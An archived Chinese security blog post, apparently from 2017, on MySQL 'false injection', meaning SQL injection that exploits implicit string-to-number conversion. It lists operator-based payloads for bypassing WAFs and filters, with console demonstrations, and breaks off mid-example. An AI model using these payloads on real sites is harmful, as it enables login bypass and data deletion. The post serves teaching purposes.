@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。 原文首发在安全客，文章地址：http://bobao.360.cn/learning/detail/3804.html有点可惜小编排版有些不是很完美。">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="False注入,以及SQL注入技巧总结">
+<meta property="og:url" content="http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/index.html">
+<meta property="og:site_name" content="Leej">
+<meta property="og:description" content="利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。 原文首发在安全客，文章地址：http://bobao.360.cn/learning/detail/3804.html有点可惜小编排版有些不是很完美。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1feyaylgza2j20fi04a3yc.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1ly1feybg15i4hj20gq03xmwz.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1feyd166k1sj20d70apgll.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mog1etcj20ao03pglh.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mog11okj207703qmx1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mofzcglj2087049q2u.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1ff8nauwxm4j20jx07374j.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/7e2785d1ly1feyrzfspc1j20at071744.jpg">
+<meta property="og:updated_time" content="2018-02-07T04:11:15.806Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="False注入,以及SQL注入技巧总结">
+<meta name="twitter:description" content="利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。 原文首发在安全客，文章地址：http://bobao.360.cn/learning/detail/3804.html有点可惜小编排版有些不是很完美。">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/mw690/7e2785d1gy1feyaylgza2j20fi04a3yc.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>False注入,以及SQL注入技巧总结</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/leejgod">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/05/15/分组密码CBC加密缺陷/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/04/24/RPO攻击/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&text=False注入,以及SQL注入技巧总结"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&is_video=false&description=False注入,以及SQL注入技巧总结"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=False注入,以及SQL注入技巧总结&body=Check out this article: http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&title=False注入,以及SQL注入技巧总结"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2017/04/25/False注入,以及SQL注入技巧总结/&name=False注入,以及SQL注入技巧总结&description=&lt;p&gt;利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。&lt;/p&gt;
+&lt;p&gt;原文首发在安全客，文章地址：&lt;a href=&#34;http://bobao.360.cn/learning/detail/3804.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://bobao.360.cn/learning/detail/3804.html&lt;/a&gt;&lt;br&gt;有点可惜小编排版有些不是很完美。&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-False-Injection"><span class="toc-number">1.</span> <span class="toc-text">0x01 False Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-引子"><span class="toc-number">1.1.</span> <span class="toc-text">0 :引子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1：MYSQL隐式类型转换"><span class="toc-number">1.2.</span> <span class="toc-text">1：MYSQL隐式类型转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、原理"><span class="toc-number">1.3.</span> <span class="toc-text">2、原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、利用"><span class="toc-number">1.4.</span> <span class="toc-text">3、利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-1、算术运算"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1、算术运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2、-位操作运算"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2、 位操作运算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-3、-比较运算符"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3、 比较运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-4、-其他"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4、 其他</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、综合利用"><span class="toc-number">1.5.</span> <span class="toc-text">4、综合利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1、结合盲注"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1、结合盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02、一些注入的技巧"><span class="toc-number">2.</span> <span class="toc-text">0x02、一些注入的技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、过滤的绕过："><span class="toc-number">2.1.</span> <span class="toc-text">1、过滤的绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、技巧："><span class="toc-number">2.2.</span> <span class="toc-text">2、技巧：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、like"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.1、like</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、Limt"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2、Limt</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、order-by"><span class="toc-number">2.2.3.</span> <span class="toc-text">2.3、order by</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、有关函数"><span class="toc-number">2.2.4.</span> <span class="toc-text">3、有关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1-不常用函数绕过滤"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">3.1 不常用函数绕过滤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2-搜索匹配类的函数"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">3.2 搜索匹配类的函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3、一些数学函数"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">3.3、一些数学函数</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-4、使用函数进行字符串的切割"><span class="toc-number">2.2.4.4.</span> <span class="toc-text">3.4、使用函数进行字符串的切割</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-关于php中md5的一个有意思的小技巧"><span class="toc-number">2.3.</span> <span class="toc-text">4 关于php中md5的一个有意思的小技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#END"><span class="toc-number">3.</span> <span class="toc-text">END</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        False注入,以及SQL注入技巧总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Leej</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-04-24T16:23:31.000Z" itemprop="datePublished">2017-04-25</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/SQL注入/">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。</p>
+<p>原文首发在安全客，文章地址：<a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3804.html</a><br>有点可惜小编排版有些不是很完美。</p>
+<a id="more"></a>
+<h3 id="0x01-False-Injection"><a href="#0x01-False-Injection" class="headerlink" title="0x01 False Injection"></a>0x01 False Injection</h3><h4 id="0-引子"><a href="#0-引子" class="headerlink" title="0 :引子"></a>0 :引子</h4><p>首先我们常见的注入<br><code>1=1</code><br><code>0&lt;1</code><br><code>&#39;&#39;=&#39;&#39;</code><br>这些都是基于1=1这样的值得比较的普通注入，下面来说说关于False注入，利用False我们可以绕过一些特定的WAF以及一些未来不确定的因素，其中有些姿势之前了解但是没有去深入，这次做一个归纳总结。</p>
+<p>首先抛出这么一个问题<br><img src="http://ww1.sinaimg.cn/mw690/7e2785d1gy1feyaylgza2j20fi04a3yc.jpg" alt=""><br>为什么username=0会导致返回数据呢？</p>
+<p>这就是一个基于false注入的例子，下面在举一个例子<br><img src="http://ww1.sinaimg.cn/mw690/7e2785d1ly1feybg15i4hj20gq03xmwz.jpg" alt=""><br>和上面是同一个表，但是为什么这里只返回了两组数据呢？<br>说到这里不得不说一说有关于MYSQL的隐式类型转换。</p>
+<h4 id="1：MYSQL隐式类型转换"><a href="#1：MYSQL隐式类型转换" class="headerlink" title="1：MYSQL隐式类型转换"></a>1：MYSQL隐式类型转换</h4><p>关于<a href="https://dev.mysql.com/doc/refman/5.6/en/type-conversion.html" target="_blank" rel="noopener">官方文档</a>中是这么说的</p>
+<p>The following rules describe how conversion occurs for comparison operations:</p>
+<ul>
+<li>If one or both arguments are <code>NULL</code>, the result of the comparison is <code>NULL</code>, except for the <code>NULL</code>-safe <a href="https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#operator_equal-to" target="_blank" rel="noopener"><code>&lt;=&gt;</code></a> equality comparison operator. For <code>NULL &lt;=&gt; NULL</code>, the result is true. No conversion is needed.</li>
+<li>If both arguments in a comparison operation are strings, they are compared as strings.</li>
+<li>If both arguments are integers, they are compared as integers.</li>
+<li>Hexadecimal values are treated as binary strings if not compared to a number.</li>
+<li>If one of the arguments is a <a href="https://dev.mysql.com/doc/refman/5.5/en/datetime.html" target="_blank" rel="noopener"><code>TIMESTAMP</code></a> or <a href="https://dev.mysql.com/doc/refman/5.5/en/datetime.html" target="_blank" rel="noopener"><code>DATETIME</code></a> column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to <a href="https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#function_in" target="_blank" rel="noopener"><code>IN()</code></a>! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using <a href="https://dev.mysql.com/doc/refman/5.5/en/comparison-operators.html#operator_between" target="_blank" rel="noopener"><code>BETWEEN</code></a> with date or time values, use <a href="https://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#function_cast" target="_blank" rel="noopener"><code>CAST()</code></a> to explicitly convert the values to the desired data type.</li>
+<li>If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.</li>
+<li>In all other cases, the arguments are compared as floating-point (real) numbers.</li>
+</ul>
+<p>其中大致是：</p>
+<ul>
+<li>如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换</li>
+<li>两个参数都是字符串，按照字符串比较。不做类型转换</li>
+<li>两个参数都是整数，按照整数比较。不做类型转换</li>
+<li>如果不与数字进行比较，则将十六进制值视为二进制字符串。</li>
+<li>有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</li>
+<li>有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</li>
+<li><strong>所有其他情况下，两个参数都会被转换为浮点数再进行比较</strong></li>
+</ul>
+<p>最后那一句话很重要，说明如果我是字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</p>
+<p>在这里我试了试如果是字符串和数字比较</p>
+<p>：<img src="http://ww1.sinaimg.cn/large/7e2785d1ly1feyd166k1sj20d70apgll.jpg" alt="">  </p>
+<p>可以看到在进行类型转换的时候，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串开头是数字的时候还是会从数字部分截断，转换为数字。</p>
+<h4 id="2、原理"><a href="#2、原理" class="headerlink" title="2、原理"></a>2、原理</h4><p>mysql在变量比较的时候进行类型转换，我们就是利用字符转换的结果为false来进行利用：  </p>
+<p><img src="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mog1etcj20ao03pglh.jpg" alt="">    </p>
+<p>其中同时0又是等于false的<br><img src="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mog11okj207703qmx1.jpg" alt="">  </p>
+<p><img src="http://ww1.sinaimg.cn/large/7e2785d1gy1ff8mofzcglj2087049q2u.jpg" alt="">  </p>
+<p>这里查看一下warning</p>
+<p><img src="http://ww1.sinaimg.cn/large/7e2785d1ly1ff8nauwxm4j20jx07374j.jpg" alt="">  </p>
+<p>发现正如官方文档所述，会转换为double，同时并不能转换所产生的warning</p>
+<p>现在可以很好理解之前为什么username=0会导致返回数据。</p>
+<p>因为这里会将数据转换为浮点数比较，但是字符串转换会出问题，从而返回false使得false=0从而为true得到结果。</p>
+<p>细心一点可以发现开篇的例子第二组passwd查询少一组数据。 </p>
+<p>关于这一点我做了一下测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;a&apos; = 0;</span><br><span class="line">+---------+</span><br><span class="line">| &apos;a&apos; = 0 |</span><br><span class="line">+---------+</span><br><span class="line">| 1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select &apos;1a&apos; = 1;</span><br><span class="line">+----------+</span><br><span class="line">| &apos;1a&apos; = 1 |</span><br><span class="line">+----------+</span><br><span class="line">| 1 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select &apos;1a1b&apos; = 1;</span><br><span class="line">+------------+</span><br><span class="line">| &apos;1a1b&apos; = 1 |</span><br><span class="line">+------------+</span><br><span class="line">|  1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select &apos;1a2b3&apos; = 1;</span><br><span class="line">+-------------+</span><br><span class="line">| &apos;1a2b3&apos; = 1 |</span><br><span class="line">+-------------+</span><br><span class="line">|  1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select &apos;a1b2c3&apos; = 0;</span><br><span class="line">+--------------+</span><br><span class="line">| &apos;a1b2c3&apos; = 0 |</span><br><span class="line">+--------------+</span><br><span class="line">|  1 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>可以观察到这里有几个特性</p>
+<ol>
+<li>如果字符串的第一个字符就是非数字的字符，那么转换为数字就是0</li>
+<li>如果字符串以数字开头</li>
+<li>如果字符串中都是数字，那么转换为数字就是整个字符串对应的数字</li>
+<li>如果字符串中存在非数字，那么转换为的数字就是开头的那些数字对应的值</li>
+</ol>
+<h4 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h4><p>实际中我们接触到的语句都是带有引号的，类似于<code>where username=&#39;+input+&#39;</code> 这样的，这时候我们就需要做一些处理来构造false注入的利用点。</p>
+<h5 id="3-1、算术运算"><a href="#3-1、算术运算" class="headerlink" title="3.1、算术运算"></a>3.1、算术运算</h5><p>加：<code>+</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;+&apos;,</span><br><span class="line">拼接的语句：where username=&apos;&apos;+&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>减：<code>-</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;-&apos;</span><br><span class="line">拼接的语句：where username=&apos;&apos;-&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>乘：<code>*</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;*&apos;</span><br><span class="line">拼接的语句：where username=&apos;&apos;*&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>除：<code>/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;/6#</span><br><span class="line">拼接的语句：where username=&apos;&apos;/6#</span><br></pre></td></tr></table></figure>
+<p>取余：<code>%</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;%1#</span><br><span class="line">拼接的语句：where username=&apos;&apos;%1#</span><br></pre></td></tr></table></figure>
+<h5 id="3-2、-位操作运算"><a href="#3-2、-位操作运算" class="headerlink" title="3.2、 位操作运算"></a>3.2、 位操作运算</h5><p>我们可以使用当字符串和数字运算的时候类型转换的问题进行利用</p>
+<p>我们可以用的位运算符有：</p>
+<p>和运算：<code>&amp;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&amp;0#</span><br><span class="line">拼接的语句：where username=&apos;&apos;&amp;0#&apos;</span><br></pre></td></tr></table></figure>
+<p>或运算：<code>|</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;|0#</span><br><span class="line">拼接的语句：where username=&apos;&apos;|0#&apos;</span><br></pre></td></tr></table></figure>
+<p>异或运算：<code>^</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;^0#</span><br><span class="line">拼接的语句：where username=&apos;&apos;^0#&apos;</span><br></pre></td></tr></table></figure>
+<p>移位操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&lt;&lt;0#</span><br><span class="line">&apos;&gt;&gt;0#</span><br></pre></td></tr></table></figure>
+<p>位非（~）：这里位非运算符由于是在表达式之前的</p>
+<h5 id="3-3、-比较运算符"><a href="#3-3、-比较运算符" class="headerlink" title="3.3、 比较运算符"></a>3.3、 比较运算符</h5><p>安全等于：<code>&lt;=&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;=0&lt;=&gt;1#</span><br><span class="line">拼接的语句：where username=&apos;&apos;=0&lt;=&gt;1#&apos;</span><br></pre></td></tr></table></figure>
+<p>不等于<code>&lt;&gt;(!=)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;=0&lt;&gt;0#</span><br><span class="line">拼接的语句：where username=&apos;&apos;=0&lt;&gt;0#&apos;</span><br></pre></td></tr></table></figure>
+<p>大小于<code>&gt;或&lt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;-1#</span><br><span class="line">拼接的语句：where username=&apos;&apos;&gt;-1#</span><br></pre></td></tr></table></figure>
+<h5 id="3-4、-其他"><a href="#3-4、-其他" class="headerlink" title="3.4、 其他"></a>3.4、 其他</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&apos;+1 is not null#</span><br><span class="line"></span><br><span class="line">&apos;in(-1,1)#</span><br><span class="line"></span><br><span class="line">&apos;not in(1,0)#</span><br><span class="line"></span><br><span class="line">&apos;like 1#</span><br><span class="line"></span><br><span class="line">&apos;REGEXP 1#</span><br><span class="line"></span><br><span class="line">&apos;BETWEEN 1 AND 1#</span><br><span class="line"></span><br><span class="line">&apos;div 1#</span><br><span class="line"></span><br><span class="line">&apos;xor 1#</span><br><span class="line"></span><br><span class="line">&apos;=round(0,1)=&apos;1</span><br><span class="line"></span><br><span class="line">&apos;&lt;&gt;ifnull(1,2)=&apos;1</span><br></pre></td></tr></table></figure>
+<h4 id="4、综合利用"><a href="#4、综合利用" class="headerlink" title="4、综合利用"></a>4、综合利用</h4><p>有时候如果我们的注入点不能有数字出现，比如过滤了数字，那我们该如何利用？  </p>
+<p>这里就可以利用一些内置的函数或运算来构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;aaa&apos;=&apos;&apos;-&apos;&apos;;</span><br><span class="line">+-------------+</span><br><span class="line">| &apos;aaa&apos;=&apos;&apos;-&apos;&apos; |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;aaa&apos;=~~&apos;&apos;;</span><br><span class="line">+------------+</span><br><span class="line">| &apos;aaa&apos;=~~&apos;&apos; |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &apos;aaa&apos;=mod(pi(),pi());</span><br><span class="line">+----------------------+</span><br><span class="line">| &apos;aaa&apos;=mod(pi(),pi()) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p>
+<p>比较多的是在登录验证的时候影响比较大，或者是在where进行限定的时候产生一些比较不可预期的错误，譬如删除数据的时候如果代码过滤不严，这里利用严重的可以删除整个表。</p>
+<p>当然这里可以通过配合其他的姿势来进行利用</p>
+<p>这里举例一道题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 